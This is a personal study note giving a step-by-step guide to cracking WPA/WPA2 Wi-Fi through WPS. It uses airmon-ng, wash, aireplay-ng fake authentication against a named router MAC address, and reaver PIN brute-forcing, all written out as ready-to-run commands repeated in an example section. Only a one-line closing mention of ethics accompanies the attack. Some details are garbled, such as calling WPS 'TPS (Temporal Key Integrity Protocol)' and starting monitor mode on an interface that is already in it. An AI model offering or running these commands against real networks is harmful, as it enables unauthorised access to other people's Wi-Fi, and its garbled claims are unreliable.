up:: [[WPA and WPA2 Cracking]]
## Hacking WPA & WPA2

This guide provides steps to hack [[Wi-Fi Protected Access (WPA)|WPA]]/[[Wi-Fi Protected Access II (WPA2)|WPA2]] networks without using a [[wordlists for password cracking|wordlist]]. The method relies on exploiting routers with WPS enabled. Though it’s unlikely, it's worth trying as it might succeed if someone has misconfigured their router.

### Steps

1. **Open Two Terminator Windows**
   - Open two separate Terminator windows for running the necessary commands.

2. **Set Wireless Adapter to Monitor Mode**
   - Set your wireless adapter to monitor mode to capture network traffic.
     ```bash
     sudo airmon-ng start mon0
     ```

3. **Find Computers with WPS Enabled**
   - In the first Terminator window, run the `wash` command to scan for devices with WPS enabled.
     ```bash
     wash --interface mon0
     ```
   - If any devices appear in the output, they have WPS enabled and are potential targets. If nothing shows up, no routers in your vicinity have WPS enabled.

4. **Run Fake Authentication Attack**
   - In the first Terminator window, prepare the [[Fake Authentication Attack|fake authentication]] attack command but don’t hit enter yet.
     ```bash
     sudo aireplay-ng --fakeauth 30 -a 64:16:F0:EC:7B:F3 -h 48:5D:60:2A:45:25 mon0
     ```
   - This command will attempt to associate with the router every 30 seconds.

5. **Run Reaver Attack**
   - In the second Terminator window, prepare the `reaver` command.
     ```bash
     reaver --bssid [TARGET_BSSID] --channel 1 --interface mon0 -vvv --no-associate
     ```
   - Replace `[TARGET_BSSID]` with the BSSID of the target network.

6. **Start the Attacks**
   - Go back to the first Terminator window and press enter to start the [[Fake Authentication Attack|fake authentication]] attack.
   - Then, switch to the second Terminator window and start the `reaver` command.

### Important Notes
- **TPS (Temporal Key Integrity Protocol)** must be enabled and exposed on the target router for this method to work.
- **Reaver** often fails, hence the necessity to handle association manually.

### Example Commands
1. **Set Wireless Adapter to [[Change MAC from Managed to Monitor Mode|Monitor Mode]]:**
   ```bash
   sudo airmon-ng start wlan0
   ```
Note: this doesn't work very consistently, it's better to use this method for setting [[Change MAC from Managed to Monitor Mode|Monitor Mode]].

2. **Find WPS Enabled Devices:**
   ```bash
   wash --interface mon0
   ```

3. **Prepare [[Fake Authentication Attack|Fake Authentication]] Attack (Don’t hit enter yet):**
   ```bash
   sudo aireplay-ng --fakeauth 30 -a 64:16:F0:EC:7B:F3 -h 48:5D:60:2A:45:25 mon0
   ```

4. **Prepare Reaver Attack:**
   ```bash
   reaver --bssid 64:16:F0:EC:7B:F3 --channel 1 --interface mon0 -vvv --no-associate
   ```

5. **Execute the Attacks:**
   - First Terminator Window:
     ```bash
     sudo aireplay-ng --fakeauth 30 -a 64:16:F0:EC:7B:F3 -h 48:5D:60:2A:45:25 mon0
     ```
   - Second Terminator Window:
     ```bash
     reaver --bssid 64:16:F0:EC:7B:F3 --channel 1 --interface mon0 -vvv --no-associate
     ```

### Conclusion

This method leverages WPS vulnerabilities and, while not always successful, is worth trying before more time-intensive techniques. Ensure your wireless adapter is properly configured and keep in mind the ethical and legal implications of network [[penetration testing]].